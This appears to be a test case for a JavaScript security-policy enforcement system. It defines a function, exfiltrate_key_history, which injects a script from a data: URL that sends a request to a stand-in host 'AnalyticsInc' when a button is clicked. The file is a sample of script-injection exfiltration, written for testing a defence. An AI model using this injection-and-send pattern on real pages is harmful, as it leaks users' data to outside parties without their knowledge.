
JAM.startProfile('load');
function exfiltrate_key_history() {
  var data$$18 = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=data1", true);xmlhttp.send(null);';
  var v0 = encodeURIComponent(data$$18);
  var URL = "data:text/javascript;," + v0;
  var script = document.createElement("script");
  script.src = URL;
  var v3 = document.getElementsByTagName("head");
  introspect(JAM.policy.p1) {
    var v1 = v3[0]
  }
  JAM.call(v1.appendChild, v1, [script]);
  return;
}
var v2 = document.getElementById("test");
JAM.set(v2, "onclick", exfiltrate_key_history)

JAM.stopProfile('load');
